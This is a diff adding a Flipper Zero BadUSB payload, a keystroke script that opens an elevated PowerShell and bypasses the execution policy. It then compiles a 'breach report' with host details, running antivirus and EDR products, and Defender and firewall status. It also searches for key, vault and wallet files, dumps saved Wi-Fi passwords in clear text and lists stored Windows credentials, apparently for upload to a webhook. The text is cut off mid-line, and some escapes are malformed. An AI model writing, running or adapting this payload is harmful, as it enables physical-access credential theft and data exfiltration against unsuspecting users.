@@ -1,0 +1,112 @@
+// FlipperZero BadUSB Payload - Final Windows Recon (File Upload)
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb RunAs"
+DELAY 2000
+ENTER
+DELAY 3000
+LEFT
+ENTER
+DELAY 2500
+STRING Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
+ENTER
+STRING \$webhook = "YOUR_WEBHOOK_URL_HERE"
+ENTER
+STRING $reportPath = "$env:TEMP\FinalReport.txt"
+ENTER
+STRING \$FullReport = @()
+ENTER
+STRING \$FullReport += "=========================================="
+ENTER
+STRING \$FullReport += "    ULTIMATE WINDOWS BREACH REPORT"
+ENTER
+STRING \$FullReport += "=========================================="
+ENTER
+STRING $FullReport += "Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+ENTER
+STRING $FullReport += "Hostname: $env:COMPUTERNAME"
+ENTER
+STRING $FullReport += "Username: $env:USERNAME"
+ENTER
+STRING $FullReport += "Domain: $env:USERDOMAIN"
+ENTER
+STRING try { $FullReport += "OS: $((Get-CimInstance Win32_OperatingSystem).Caption)" } catch { \$FullReport += "OS: Could not retrieve." }
+ENTER
+STRING $FullReport += "Architecture: $env:PROCESSOR_ARCHITECTURE"
+ENTER
+STRING try { $FullReport += "RAM: $([math]::Round((Get-CimInstance -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)) GB" } catch { \$FullReport += "RAM: Could not retrieve." }
+ENTER
+STRING \$FullReport += ""
+ENTER
+STRING \$FullReport += "---- PRIVILEGE ESCALATION CHECK ----"
+ENTER
+STRING $FullReport += "Running as Administrator: $([bool]([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))"
+ENTER
+STRING \$FullReport += ""
+ENTER
+STRING \$FullReport += "---- DETAILED SYSTEM & HARDWARE ----"
+ENTER
+STRING try { $FullReport += "Motherboard: $((Get-CimInstance Win32_BaseBoard).Manufacturer) \$((Get-CimInstance Win32_BaseBoard).Product)" } catch { }
+ENTER
+STRING try { $FullReport += "BIOS: $((Get-CimInstance Win32_BIOS).SMBIOSBIOSVersion)" } catch { }
+ENTER
+STRING try { $FullReport += "CPU: $((Get-CimInstance Win32_Processor).Name)" } catch { }
+ENTER
+STRING \$FullReport += "Disks:"
+ENTER
+STRING try { Get-CimInstance Win32_LogicalDisk | ForEach-Object { $FullReport += "- $($_.DeviceID) [$($_.VolumeName)] ($([math]::Round($_.Size / 1GB, 2)) GB Total, $([math]::Round(\$_.FreeSpace / 1GB, 2)) GB Free)" } } catch { }
+ENTER
+STRING \$FullReport += ""
+ENTER
+STRING \$FullReport += "---- SECURITY POSTURE ANALYSIS ----"
+ENTER
+STRING \$SecurityKeywords = @('defender', 'crowdstrike', 'sentinelone', 'mcafee', 'symantec', 'norton', 'kaspersky', 'avast', 'avg', 'bitdefender', 'eset', 'trend micro', 'sophos', 'fireeye', 'carbon black', 'cylance', 'malwarebytes')
+ENTER
+STRING \$FullReport += "Running Security Processes:"
+ENTER
+STRING try { Get-Process | Where-Object { ($SecurityKeywords | ForEach-Object { if ($_.ProcessName -like "*$_*") { $true } }) -contains \$true } | Select-Object -Unique ProcessName | ForEach-Object { $FullReport += "- $(\$_.ProcessName)" } } catch { }
+ENTER
+STRING \$FullReport += "Windows Defender Status:"
+ENTER
+STRING try { Get-MpComputerStatus | Select-Object AntispywareEnabled, AntivirusEnabled, RealTimeProtectionEnabled | ForEach-Object { $_.PSObject.Properties | ForEach-Object { $FullReport += "- $($_.Name): $($_.Value)" } } } catch { \$FullReport += "- Could not query Windows Defender status." }
+ENTER
+STRING \$FullReport += "Windows Firewall Profiles:"
+ENTER
+STRING try { Get-NetFirewallProfile | Select-Object Name, Enabled | ForEach-Object { $FullReport += "- $($_.Name): $(\$_.Enabled)" } } catch { }
+ENTER
+STRING \$FullReport += ""
+ENTER
+STRING \$FullReport += "---- NETWORK RECONNAISSANCE ----"
+ENTER
+STRING \$FullReport += "IP Configuration:"
+ENTER
+STRING try { Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -like '*Ethernet*' -or $_.InterfaceAlias -like '*Wi-Fi*' } | ForEach-Object { $FullReport += "- $($_.InterfaceAlias): $(\$_.IPAddress)" } } catch { }
+ENTER
+STRING \$FullReport += "Active TCP Connections (ESTABLISHED - First 10):"
+ENTER
+STRING try { Get-NetTCPConnection | Where-Object { \$_.State -eq 'Established' } | Select-Object -First 10 | ForEach-Object { $FullReport += "- $($_.LocalAddress):$($_.LocalPort) <--> $($_.RemoteAddress):$(\$_.RemotePort)" } } catch { }
+ENTER
+STRING \$FullReport += ""
+ENTER
+STRING \$FullReport += "---- USER FILE HUNT ----"
+ENTER
+STRING \$userPath = Environment.GetFolderPath("UserProfile")
+ENTER
+STRING \$searchPatterns = @("*.kdbx", "*.ppk", "*.pem", "*.key", "*.rdg", "*.aws", "wallet.dat")
+ENTER
+STRING foreach (\$pattern in \$searchPatterns) { try { Get-ChildItem -Path \$userPath -Recurse -Filter \$pattern -ErrorAction SilentlyContinue | Select-Object -First 5 | ForEach-Object { $FullReport += "FOUND: $(\$_.FullName)" } } catch { } }
+ENTER
+STRING \$FullReport += ""
+ENTER
+STRING \$FullReport += "---- CREDENTIAL & WIFI DUMP ----"
+ENTER
+STRING \$FullReport += "WIFI PROFILES (CLEAR TEXT):"
+ENTER
+STRING try { \$wifiProfiles = (netsh wlan show profiles) | Select-String ":" | ForEach-Object { $_.Split(":")[1].Trim() }; foreach ($profile in $wifiProfiles) { $passInfo = netsh wlan show profile name="$profile" key=clear; $FullReport += "SSID: \$profile"; $FullReport += ($passInfo | Select-String "Key Content").Trim() } } catch { \$FullReport += "Could not retrieve WiFi profiles." }
+ENTER
+STRING \$FullReport += "SAVED WINDOWS CREDENTIALS:"
+ENTER
+STRING try { $creds = cmdkey /list; $creds | ForEach-Object { $FullReport += $_ } } catch { \$FullReport += "Could not retrieve saved credentials." }
+ENTER
+STRING \$Full
